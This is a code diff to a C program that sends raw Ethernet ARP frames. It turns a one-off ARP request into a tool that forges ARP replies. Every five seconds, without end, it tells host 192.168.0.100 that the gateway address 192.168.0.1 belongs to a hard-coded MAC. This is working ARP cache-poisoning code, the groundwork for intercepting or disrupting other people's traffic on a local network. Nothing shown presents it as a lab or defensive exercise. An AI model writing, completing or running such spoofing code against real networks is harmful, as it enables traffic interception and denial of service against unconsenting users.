@@ -1,16 +1,19 @@
 #include "arp.h"
 
-int main(){
+int main(int argc, char **argv){
     int sd;
-    char* interface = "wlp3s0";
+    char* interface = argv[1];
     struct sockaddr_ll device;
-    uint8_t mac_src[6], ether_frame[IP_MAXPACKET];
-    uint8_t ip_src_array[4] = {192, 168, 0, 255}, ip_dst_array[4] = {192, 168, 0, 1};
+    uint8_t ether_frame[IP_MAXPACKET];
+    memset(ether_frame, 0, sizeof(ether_frame));
+    uint8_t mac_src[6] = {0x34, 0xa8, 0xeb, 0x4d, 0xce, 0x8d};
+    uint8_t mac_dst[6] = {0x20, 0x3c, 0xae ,0x92, 0xff, 0x65};
+    uint8_t ip_src_array[4] = {192, 168, 0, 1}, ip_dst_array[4] = {192, 168, 0, 100};
     uint32_t ip_src = array2ip(ip_src_array), ip_dst = array2ip(ip_dst_array);
     arp_hdr arphdr;
-    print_ipv4 (ip_src);
-    get_rand_mac (mac_src);
-    print_mac (mac_src);
+    print_ipv4 (ip_src, stdout);
+    // get_rand_mac (mac_src);
+    print_mac (mac_src, stdout);
 
     device.sll_ifindex = if_nametoindex (interface);
     device.sll_family = AF_PACKET;
@@ -22,10 +25,12 @@ int main(){
         exit (EXIT_FAILURE);
     }
 
-    set_request_arphdr (&arphdr, mac_src, &ip_src, &ip_dst);
-    set_broadcast_eth (ether_frame, &arphdr, mac_src);
-    // while(1) never tried this
-        send_ether_frame (ether_frame, 42, device);
+    set_reply_arphdr (&arphdr, mac_src, &ip_src, mac_dst, &ip_dst);
+    set_eth (ether_frame, &arphdr, mac_src, mac_dst);
+    while(1){
+        send_ether_frame (ether_frame, 60, device);
+        sleep(5);
+    }
 
     close (sd);
 }
